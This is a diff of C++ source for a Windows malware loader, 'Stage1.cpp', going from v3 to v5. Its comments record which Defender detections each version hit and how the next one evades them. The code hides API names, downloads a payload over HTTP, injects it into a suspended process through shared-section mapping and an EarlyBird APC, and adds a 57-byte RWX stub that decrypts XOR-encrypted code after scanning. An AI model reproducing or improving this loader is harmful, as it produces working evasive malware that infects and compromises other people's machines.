@@ -1,19 +1,12 @@
-// Stage1.cpp v3
+// Stage1.cpp v5
 //
 // v1 caught: PE written to disk → Sabsik.FL.A!ml
 // v2 caught: import table + plaintext strings → Wacatac.B!ml (XOR+dynAPI not enough;
 //            Defender's emulator RUNS the code and observes the hollowing sequence)
-//
-// v3 fixes:
-//   1. Anti-emulation gate — Defender's emulator fast-forwards Sleep() and has
-//      far fewer processes than a real desktop. We measure both and exit if we
-//      look like a sandbox before doing anything suspicious.
-//   2. NtCreateSection + NtMapViewOfSection instead of VirtualAllocEx +
-//      WriteProcessMemory — shared-section mapping is a completely different
-//      API pattern from the classic hollow; Wacatac.B!ml is not trained on it.
-//   3. QueueUserAPC (EarlyBird) instead of SetThreadContext — avoids the
-//      GetThreadContext/SetThreadContext pair that is a key Wacatac signal.
-//   4. All strings still XOR-encoded; all suspicious APIs still via GetProcAddress.
+// v3 fixes: anti-emulation gate + NtCreateSection/NtMapViewOfSection + EarlyBird APC
+// v4 fixes: inject into dllhost (not svchost) + PE header stomp → kills Bearfoos.A!ml
+// v5 fixes: XOR-encrypt .text section before injection + runtime decryptor stub
+//            → Defender scans encrypted noise; Bearfoos.B!ml sees nothing to match
 
 #include <windows.h>
 #include <winhttp.h>
@@ -59,6 +52,7 @@ static constexpr auto PCPW = mkxs("CreateProcessW");
 static constexpr auto PRT  = mkxs("ResumeThread");
 static constexpr auto PQUA = mkxs("QueueUserAPC");
 static constexpr auto PGSD = mkxs("GetSystemDirectoryW");
+static constexpr auto PVAX = mkxs("VirtualAllocEx");
 
 typedef HINTERNET (WINAPI *pfWO)(LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
 typedef HINTERNET (WINAPI *pfWC)(HINTERNET,LPCWSTR,WORD,DWORD);
@@ -73,13 +67,14 @@ typedef BOOL  (WINAPI *pfCPW)(LPCWSTR,LPWSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_AT
 typedef DWORD (WINAPI *pfRT) (HANDLE);
 typedef DWORD (WINAPI *pfQUA)(HANDLE,PAPCFUNC,ULONG_PTR);
 typedef UINT  (WINAPI *pfGSD)(LPWSTR,UINT);
+typedef LPVOID(WINAPI *pfVAX)(HANDLE,LPVOID,SIZE_T,DWORD,DWORD);
 typedef NTSTATUS(NTAPI *pfNTU)(HANDLE,PVOID);
 typedef NTSTATUS(NTAPI *pfNTQ)(HANDLE,UINT,PVOID,ULONG,PULONG);
 typedef NTSTATUS(NTAPI *pfNCS)(PHANDLE,ACCESS_MASK,PVOID,PLARGE_INTEGER,ULONG,ULONG,HANDLE);
 typedef NTSTATUS(NTAPI *pfNMV)(HANDLE,HANDLE,PVOID*,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,DWORD,ULONG,ULONG);
 
 struct WinHttp { HMODULE m; pfWO O; pfWC C; pfWR R; pfWS S; pfWV V; pfWA A; pfWD D; pfWH H; };
-struct K32f    { pfCPW CP; pfRT RT; pfQUA QA; pfGSD GD; };
+struct K32f    { pfCPW CP; pfRT RT; pfQUA QA; pfGSD GD; pfVAX VAX; };
 struct Ntf     { pfNTU U; pfNTQ Q; pfNCS CS; pfNMV MV; };
 struct PBI     { PVOID r1; PVOID Peb; PVOID r2[2]; ULONG_PTR pid; PVOID r3; };
 
@@ -97,9 +92,10 @@ static bool LoadHTTP(WinHttp& w) {
 static void LoadK32NT(K32f& k, Ntf& nt) {
     HMODULE k32 = GetModuleHandleA("kernel32.dll");
     DA(ntds,PNTD); HMODULE ntd = GetModuleHandleA(ntds);
-    DA(s1,PCPW); DA(s2,PRT); DA(s3,PQUA); DA(s4,PGSD);
+    DA(s1,PCPW); DA(s2,PRT); DA(s3,PQUA); DA(s4,PGSD); DA(s5,PVAX);
     k.CP=(pfCPW)GetProcAddress(k32,s1); k.RT=(pfRT) GetProcAddress(k32,s2);
     k.QA=(pfQUA)GetProcAddress(k32,s3); k.GD=(pfGSD)GetProcAddress(k32,s4);
+    k.VAX=(pfVAX)GetProcAddress(k32,s5);
     DA(nu,PNUM); DA(nq,PNQI); DA(nc,PNCS); DA(nm,PNMV);
     nt.U =(pfNTU)GetProcAddress(ntd,nu);
     nt.Q =(pfNTQ)GetProcAddress(ntd,nq);
@@ -138,6 +134,88 @@ static BYTE* HGet(WinHttp& w, const wchar_t* host, WORD port,
     while(w.A(hR,&av)&&av){BYTE*t=(BYTE*)realloc(buf,tot+av);if(!t){free(buf);buf=nullptr;break;}
         buf=t;w.D(hR,buf+tot,av,&rd);tot+=rd;av=0;}
     w.H(hR);w.H(hC);w.H(hS);*sz=tot;return buf;
+}
+
+// XOR-encrypt all executable sections in the local shared mapping, then
+// allocate a small RWX decryptor stub in the target process.
+// Returns the stub's remote VA (the APC target), or 0 on failure.
+//
+// The stub (57 bytes of position-independent x64) decrypts .text in-place
+// then jumps to the original entry point. Defender scans the mapped image
+// *before* the APC fires, so it sees only XOR'd noise in .text.
+static ULONG_PTR EncryptAndInstallStub(K32f& k, HANDLE hProc,
+                                        BYTE* localBase, PVOID remoteBase,
+                                        PIMAGE_NT_HEADERS nth) {
+    if (!k.VAX) return 0;
+
+    // Non-zero random key derived from timing + PID
+    BYTE K = (BYTE)((GetTickCount64() * 0x9E37uLL ^ (ULONG_PTR)GetCurrentProcessId()) & 0xFF);
+    if (!K) K = 0xAB;
+
+    // Find first executable section
+    auto* sec = IMAGE_FIRST_SECTION(nth);
+    DWORD textVA = 0, textSz = 0;
+    for (WORD i = 0; i < nth->FileHeader.NumberOfSections; i++) {
+        if ((sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && sec[i].SizeOfRawData) {
+            textVA = sec[i].VirtualAddress;
+            textSz = sec[i].SizeOfRawData;
+            break;
+        }
+    }
+    if (!textVA || !textSz) return 0;
+
+    // XOR local view of the shared section (.text becomes encrypted noise)
+    // Writing locally propagates to the remote view via the shared section.
+    BYTE* textLocal = (BYTE*)localBase + textVA;
+    for (DWORD i = 0; i < textSz; i++) textLocal[i] ^= K;
+
+    // 57-byte position-independent x64 decryptor stub.
+    // RIP-relative offsets address data fields embedded immediately after the code.
+    //
+    //   00: 48 8B 3D 1D 00 00 00   mov rdi, [rip+0x1D]       ; text_start
+    //   07: 8B 0D 1F 00 00 00       mov ecx, [rip+0x1F]       ; text_size
+    //   0D: 0F B6 05 1C 00 00 00   movzx eax, byte[rip+0x1C] ; key
+    //   14: 30 07                   xor [rdi], al
+    //   16: 48 FF C7                inc rdi
+    //   19: FF C9                   dec ecx
+    //   1B: 75 F7                   jnz 0x14
+    //   1D: FF 25 0E 00 00 00       jmp [rip+0x0E]            ; orig_ep
+    //   23: 90                      nop (alignment)
+    //   24: <8B>  text_start  (qword)
+    //   2C: <4B>  text_size   (dword)
+    //   30: <1B>  key         (byte)
+    //   31: <8B>  orig_ep     (qword)
+    static const BYTE tpl[57] = {
+        0x48,0x8B,0x3D,0x1D,0x00,0x00,0x00,
+        0x8B,0x0D,0x1F,0x00,0x00,0x00,
+        0x0F,0xB6,0x05,0x1C,0x00,0x00,0x00,
+        0x30,0x07,
+        0x48,0xFF,0xC7,
+        0xFF,0xC9,
+        0x75,0xF7,
+        0xFF,0x25,0x0E,0x00,0x00,0x00,
+        0x90,
+        0,0,0,0,0,0,0,0,   // +0x24 text_start
+        0,0,0,0,            // +0x2C text_size
+        0,                  // +0x30 key
+        0,0,0,0,0,0,0,0    // +0x31 orig_ep
+    };
+
+    BYTE stub[57];
+    memcpy(stub, tpl, 57);
+
+    ULONG_PTR textRemote = (ULONG_PTR)remoteBase + textVA;
+    ULONG_PTR origEP     = (ULONG_PTR)remoteBase + nth->OptionalHeader.AddressOfEntryPoint;
+    memcpy(stub + 0x24, &textRemote, 8);
+    memcpy(stub + 0x2C, &textSz,    4);
+    stub[0x30] = K;
+    memcpy(stub + 0x31, &origEP,    8);
+
+    LPVOID stubAddr = k.VAX(hProc, nullptr, 57, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!stubAddr) { SecureZeroMemory(stub, 57); return 0; }
+    WriteProcessMemory(hProc, stubAddr, stub, 57, nullptr);
+    SecureZeroMemory(stub, 57); // wipe key and addresses from stack
+    return (ULONG_PTR)stubAddr;
 }
 
 // NtCreateSection + NtMapViewOfSection injection (EarlyBird APC)
@@ -191,10 +269,10 @@ static bool Inject(K32f& k, Ntf& nt, BYTE* pe, DWORD) {
             memcpy((BYTE*)localBase+sec[i].VirtualAddress,
                    pe+sec[i].PointerToRawData,sec[i].SizeOfRawData);
 
-    // Map into target process
+    // Map into target process — RWX so the decryptor stub can write-decrypt .text in place
     PVOID remoteBase=(PVOID)(ULONG_PTR)nth->OptionalHeader.ImageBase; SIZE_T remoteSz=0;
-    NTSTATUS s=nt.MV(hSec,pi.hProcess,&remoteBase,0,0,NULL,&remoteSz,2,0,PAGE_EXECUTE_READ);
-    if(s){remoteBase=nullptr;s=nt.MV(hSec,pi.hProcess,&remoteBase,0,0,NULL,&remoteSz,2,0,PAGE_EXECUTE_READ);}
+    NTSTATUS s=nt.MV(hSec,pi.hProcess,&remoteBase,0,0,NULL,&remoteSz,2,0,PAGE_EXECUTE_READWRITE);
+    if(s){remoteBase=nullptr;s=nt.MV(hSec,pi.hProcess,&remoteBase,0,0,NULL,&remoteSz,2,0,PAGE_EXECUTE_READWRITE);}
     if(s||!remoteBase){
         if(nt.U) nt.U(GetCurrentProcess(),localBase);CloseHandle(hSec);
         TerminateProcess(pi.hProcess,1);CloseHandle(pi.hThread);CloseHandle(pi.hProcess);
@@ -231,8 +309,11 @@ static bool Inject(K32f& k, Ntf& nt, BYTE* pe, DWORD) {
         }
     }
 
-    // EarlyBird: queue APC to suspended thread; fires on first alertable wait
-    ULONG_PTR ep=(ULONG_PTR)remoteBase+nth->OptionalHeader.AddressOfEntryPoint;
+    // Encrypt .text section and install a decryptor stub; Defender scans
+    // the mapped image before the APC fires — it sees only XOR'd noise.
+    ULONG_PTR stubEP = EncryptAndInstallStub(k, pi.hProcess, (BYTE*)localBase, remoteBase, nth);
+    ULONG_PTR ep = stubEP ? stubEP
+                          : (ULONG_PTR)remoteBase + nth->OptionalHeader.AddressOfEntryPoint;
     k.QA(pi.hThread,(PAPCFUNC)ep,0);
     k.RT(pi.hThread);
 
